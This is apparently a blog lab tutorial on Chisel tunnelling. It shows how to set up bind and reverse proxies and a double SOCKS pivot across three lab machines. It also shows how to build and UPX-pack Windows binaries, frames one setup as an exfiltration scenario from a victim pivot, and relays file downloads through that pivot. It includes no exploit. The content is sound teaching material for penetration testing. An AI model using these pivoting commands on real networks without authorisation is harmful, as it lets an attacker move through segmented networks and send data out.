---
title: Using Chisel
author:
  name: kill5witch
  link: https://github.com/an9k0r
date: 2021-12-25 11:33:00 +0200
categories: [Blogging, Guides]
tags: [Tunneling, Pivoting]
math: true
mermaid: true
---
**Reverse and Bind Proxy using Chisel // There is no exploitation involved!**

# Lab Setup <a href="#lab-setup" id="lab-setup"></a>

![](https://gblobscdn.gitbook.com/assets%2F-MIxcYhWyGCoV7j2xCX\_%2F-MMMa\_l\_gM83qoxbcIyz%2F-MMMakUk24zIFBd6Wnmp%2Fimage.png?alt=media\&token=aba8c540-8cb6-4ee8-a89e-12acd5c029b6)

```
Kali = 192.168.40.214 
Win7 / Pivot#1 Interface#1 = 192.168.40.217 
Win7 / Pivot#1 Interface#2 = 192.168.118.176 
Linux Server / Pivot#2 interface#1 = 192.168.118.132 
Linux Server / Pivot#2 Interface #2 = 192.168.50.129 
WebServer = 192.168.50.128
```

# Download and Installation

Chisel can be downloaded here: [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

Simply follow instructions there to download chisel - you will also need GO. Move to the directory where you've downloaded the chisel.

Build it without debug

```
go build -ldflags="-s -w" chisel
```

Compress it even further

```
upx brute chisel
```

You don't have to build it for Windows if you won't be using/pivoting windows boxes but here is how it can be done:

```
#x86 version
env GOOS=windows GOARCH=386 go build -o chisel-x86.exe -ldflags "-s -w"

#x64 version
env GOOS=windows GOARCH=amd64 go build -o chisel-x64.exe -ldflags "-s -w" 

#(optional - compress it)
upx brute ./chisel-x86.exe
upx brute ./chisel-x64.exe
```

# Bind Proxy

**(Exfiltration Scenario - send data through Pivot#1 (Win7) to Kali where there is no direct access from e.g. corporate network)\* This is however just one use case**

![](<../.gitbook/assets/image (103).png>)

So, lets begin setting server on kali:

```
chisel server --host 192.168.40.214 -p 4000
```

![](https://gblobscdn.gitbook.com/assets%2Fos-cybersec%2F-MM5rry18v5IEAyTMx07%2F-MM5tW8WqG6f-2T5jMQS%2F0.png?alt=media)

You can see above on the right that Port 4000 has been opened on the chisel Server (on Kali) and is listening. This is common to both reverse and bind Proxy.

Listener will be opened on the Windows7/Pivot#1 Machine

```
chisel-x86.exe client 192.168.40.214:4000 8001:127.0.0.1:9001
```

![](https://gblobscdn.gitbook.com/assets%2Fos-cybersec%2F-MM5rry18v5IEAyTMx07%2F-MM5tW8XzWmxbpSN0wWc%2F1.png?alt=media)

Now here is important to understand what the second part of command _8001:127.0.0.1:9001_ actually means. Port 8001 has been opened on the Client (Win7 Machine) and is listening on ALL Interfaces (0.0.0.0). Traffic will be relayed to 127.0.0.1:9001 (on the Server - which is Kali)

I am now able to send anything to Port 8001 on ANY Interface on the Client/Win7 (192.168.40.217 OR 192.168.118.132 OR 127.0.0.1) on port 8001. This will get piped through the Chisel tunnel to 127.0.0.1 on Kali to port

All that is needed to do is, set a listener on Kali on port 9001

![](https://gblobscdn.gitbook.com/assets%2Fos-cybersec%2F-MM5rry18v5IEAyTMx07%2F-MM5tW8ZcKU5NbKrOOP1%2F3.png?alt=media)

I am now able to send anything to Kali over Win7 tunnel

![](https://gblobscdn.gitbook.com/assets%2Fos-cybersec%2F-MM5rry18v5IEAyTMx07%2F-MM5tW8\_zyQpD5b43EdJ%2F4.png?alt=media)

# **Reverse** <a href="#reverse" id="reverse"></a>

## Simple Reverse Port Forward / Single Pivot

The biggest difference compared to bind proxy is where the listener will reside at, and that is on the server. The tunnel connection will also get initated from the victim/Pivot#1/win7.

Lets start chisel server on Kali

```
chisel server --host 192.168.40.214 -p 4000 --reverse
```

![](https://gblobscdn.gitbook.com/assets%2Fos-cybersec%2F-MM5rry18v5IEAyTMx07%2F-MM5tW8dtSSrSmxKRMpt%2F8.png?alt=media)

... and client on the Win7 which will be 1st Pivot machine. The second part of command _R:4001:192.168.118.132:80_ also defines where the connection will be proxied to which is 192.168.118.132:80 (Linux Server / Pivot#2). (R: we have to define R for reverse connections)

```
chisel 192.168.40.214:4000 R:4001:192.168.118.132:80
```

![](https://gblobscdn.gitbook.com/assets%2Fos-cybersec%2F-MM5rry18v5IEAyTMx07%2F-MM5tW8ecIh9POKFORbY%2F9.png?alt=media)

The listener is now on Kali - when using Bind Proxy the listener will be on the Client (in my case on Win7/Pivot#1)

![](https://gblobscdn.gitbook.com/assets%2Fos-cybersec%2F-MM5rry18v5IEAyTMx07%2F-MM5tW8fXRT8DuO96fis%2F10.png?alt=media)

Test - i am able to reach Linux Server on Port 80 from Kali through Win7/Pivot#1

![](https://gblobscdn.gitbook.com/assets%2Fos-cybersec%2F-MM5rry18v5IEAyTMx07%2F-MM5tW8gPpsqXNDLWeZZ%2F11.png?alt=media)

## Double Pivot using SOCKS

In order to reach Webserver which is 2 "hops" away i need to pivot through Win7/Pivot#1 and Linux Server/Pivot#2. (i have chisel on both already - there is no Exploitation involved).&#x20;

!Important! - If you can get first pivot setup correctly, setting the 2nd one is basically doing exactly the same BUT keep in mind that you either need more than 1 session (if you're using SSH / Shell / meterpreter/ whatever) or send chisel processes to background (for example: start-process on window or ampersand in linux).

Lets start reverse server with adding --socks5

```
chisel server --host 192.168.40.214 -p 4000 --socks5 --reverse
```

![](https://gblobscdn.gitbook.com/assets%2Fos-cybersec%2F-MM5rry18v5IEAyTMx07%2F-MM5tW8h0jxHH1Sgh-Wk%2F12.png?alt=media)

On Win7/Pivot#1 we have to specify the local listener (which will be on Kali). I used Port 3080

Pivot#1

![](https://gblobscdn.gitbook.com/assets%2Fos-cybersec%2F-MM5rry18v5IEAyTMx07%2F-MM5tW8iqzpCGR9U6\_us%2F13.png?alt=media)

And start a server just like we did on Kali

![](https://gblobscdn.gitbook.com/assets%2Fos-cybersec%2F-MM5rry18v5IEAyTMx07%2F-MM5tW8j6kU6B6V4CuOb%2F14.png?alt=media)

On Pivot#2/Linux Server we start a client but its important to pay attention to listeners interface (192.168.118.176 is Interface on Pivot#1 and will be reachable after Kali connects through the first socks proxy).

![](https://gblobscdn.gitbook.com/assets%2Fos-cybersec%2F-MM5rry18v5IEAyTMx07%2F-MM5tW8knIa45CB68qdw%2F15.png?alt=media)

(again, the listener and its interface will be defined on the client which means - i have to define listener for socky proxy on Pivot#2 for Pivot#1).

Lets add following two proxys to /etc/proxychains on Kali

```
socks5 127.0.0.1 3080
socks5 192.168.118.176 7080
```

And i can reach webserver on 192.168.50.128:80

![](https://gblobscdn.gitbook.com/assets%2Fos-cybersec%2F-MM5rry18v5IEAyTMx07%2F-MM5tW8lTfSWQ-YCnjuv%2F16.png?alt=media)

```
|S-chain|-<>-127.0.0.1:3080-<>-192.168.118.176:7080-<><>-192.168.50.128:80-<><>-OK
```

## **Using Reverse to download chisel on Pivot#2 from Kali (no direct access)**

Lets say i want to download something from the Kali (for example the chisel itself) over Pivot#1 which is in my case Win7.

Now the roles over server/client are swaped so Pivot#1 (Win7) will be server and Kali will be set as a client.

```
chisel-x86.exe server -p 5000 --reverse # on Pivot#1 (Win7)
chisel client 192.168.40.217:5000 4001:127.0.0.1:9001 # on Kali
```

![](https://gblobscdn.gitbook.com/assets%2Fos-cybersec%2F-MM5rry18v5IEAyTMx07%2F-MM5tW8acP58DRWhkTfd%2F5.png?alt=media)

Connection from Linux Server will now go through Pivot#1 (Win7) and if i set a webserver on Kali on port 8000 the file will be downloaded

![](https://gblobscdn.gitbook.com/assets%2Fos-cybersec%2F-MM5rry18v5IEAyTMx07%2F-MM5tW8bg7QccLJhY5zQ%2F6.png?alt=media)

![](https://gblobscdn.gitbook.com/assets%2Fos-cybersec%2F-MM5rry18v5IEAyTMx07%2F-MM5tW8cMiCcf3naph9x%2F7.png?alt=media)

# Summary <a href="#summary" id="summary"></a>

Chisel is a great tool no doubts on that but the message i'd like to put out there is: Practice Pivoting in your own lab because it is easier to troubleshoot if somethings does not work as expected. I used 3 VMs (doesnt really matter if Linux or Windows).&#x20;
